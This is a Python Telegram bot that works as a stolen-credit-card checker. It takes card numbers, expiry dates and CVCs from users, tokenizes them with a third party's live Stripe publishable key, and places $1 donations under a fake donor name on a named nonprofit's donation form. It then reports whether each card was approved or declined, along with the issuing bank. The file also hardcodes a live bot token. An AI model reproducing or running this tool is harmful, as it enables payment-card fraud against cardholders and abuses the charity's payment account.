import logging
import json
import base64
import uuid
import requests
import asyncio
import os
from flask import Flask
from threading import Thread
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "7950514269:AAElXX262n31xiSn1pCxthxhuMpjw9VjtVg"
STRIPE_PUB_KEY = "pk_live_51PkGkaIRDCrkHdam1J6d75GTxgcup9PPQ1dEaperGsiO1hGoSNhocKLr49UmfqSHFpsU0ISB4m0tz0u1B3rtYFMe006ykJTsq0"
STRIPE_ACCOUNT = "acct_1PkGkaIRDCrkHdam"
WP_SITE = "https://ocdtn.org/"

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# --- WEB SERVER FOR RENDER ---
app = Flask(__name__)

@app.route('/')
def health_check():
    return "Bot is active", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# --- BIN LOOKUP ---
def get_bin_info(card_no):
    try:
        bin_code = card_no[:6]
        res = requests.get(f"https://lookup.binlist.net/{bin_code}", timeout=5)
        if res.status_code == 200:
            data = res.json()
            bank = data.get('bank', {}).get('name', 'Unknown Bank')
            country = data.get('country', {}).get('name', 'Unknown')
            flag = data.get('country', {}).get('emoji', '🌐')
            return f"{flag} {bank} | ({country})"
    except:
        pass
    return "❌ BIN info unavailable"

# --- BOT HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🚀 **Bot Online**\nFormat: `NUMBER|MM|YYYY|CVC`", parse_mode='Markdown')

async def process_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text
    if "|" not in user_input: return

    status_msg = await update.message.reply_text("⏳ **Processing...**", parse_mode='Markdown')
    
    try:
        details = user_input.split('|')
        if len(details) < 4:
            await status_msg.edit_text("❌ Format: `NUMBER|MM|YYYY|CVC`")
            return
        
        card_no, month, year, cvc = [d.strip() for d in details]
        bin_info = get_bin_info(card_no)

        muid, sid, guid = str(uuid.uuid4()), str(uuid.uuid4()), str(uuid.uuid4())
        session = requests.Session()

        # --- STEP 1: TOKENIZATION ---
        pm_url = "https://api.stripe.com/v1/payment_methods"
        
        # We use the Public Key in the data for this step
        pm_data = {
            'type': 'card',
            'card[number]': card_no,
            'card[cvc]': cvc,
            'card[exp_month]': month,
            'card[exp_year]': year,
            'key': STRIPE_PUB_KEY,
            'muid': muid, 'sid': sid, 'guid': guid,
            'payment_user_agent': 'stripe.js/c264a67020; stripe-js-v3/c264a67020'
        }

        res = session.post(pm_url, data=pm_data)
        if res.status_code != 200:
            err = res.json().get('error', {}).get('message', 'Auth Error')
            await status_msg.edit_text(f"❌ **Step 1 Error:** `{err}`")
            return

        pm_id = res.json()['id']

        # --- STEP 2: SITE LINKING ---
        wp_params = {'givewp-route': 'donate', 'givewp-route-signature': '30d2c3acca50cc6b9b43c103db00e08f'}
        wp_payload = {
            'amount': '1.00', 'currency': 'USD', 'gatewayId': 'stripe_payment_element',
            'email': 'testuser@gmail.com', 'firstName': 'Test', 'lastName': 'User',
            'gatewayData[stripePaymentMethod]': pm_id,
            'gatewayData[stripeKey]': STRIPE_PUB_KEY,
            'gatewayData[stripeConnectedAccountId]': STRIPE_ACCOUNT
        }

        wp_res = session.post(WP_SITE, params=wp_params, data=wp_payload)
        client_secret = wp_res.json().get('data', {}).get('clientSecret')

        if not client_secret:
            await status_msg.edit_text("❌ **Step 2 Error:** Could not get Client Secret from site.")
            return

        # --- STEP 3: FINAL CONFIRMATION (Fixing Authorization) ---
        pi_id = client_secret.split('_secret_')[0]
        confirm_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
        
        # To confirm WITHOUT a Secret Key, we must pass the Publishable Key as Bearer Auth
        # and include the client_secret in the body.
        confirm_headers = {
            'Authorization': f'Bearer {STRIPE_PUB_KEY}',
            'Content-Type': 'application/x-form-urlencoded'
        }
        
        confirm_data = {
            'payment_method': pm_id,
            'client_secret': client_secret,
            'use_stripe_sdk': 'true'
        }

        final_res = session.post(confirm_url, headers=confirm_headers, data=confirm_data)

        if final_res.status_code == 200:
            status = final_res.json().get('status', 'SUCCESS').upper()
            await status_msg.edit_text(f"✅ **COMPLETED**\n💳 {bin_info}\n📊 Status: `{status}`\n🆔 `{pi_id}`")
        else:
            err = final_res.json().get('error', {}).get('message', 'Decline')
            await status_msg.edit_text(f"❌ **DECLINED**\n💳 {bin_info}\n📝 Reason: `{err}`")

    except Exception as e:
        logger.error(f"Error: {e}")
        await status_msg.edit_text(f"⚠️ **System Error:** `{str(e)}`")

async def main():
    Thread(target=run_flask, daemon=True).start()
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_card))
    await application.initialize()
    await application.start()
    await application.updater.start_polling(drop_pending_updates=True)
    while True: await asyncio.sleep(3600)

if __name__ == '__main__':
    asyncio.run(main())
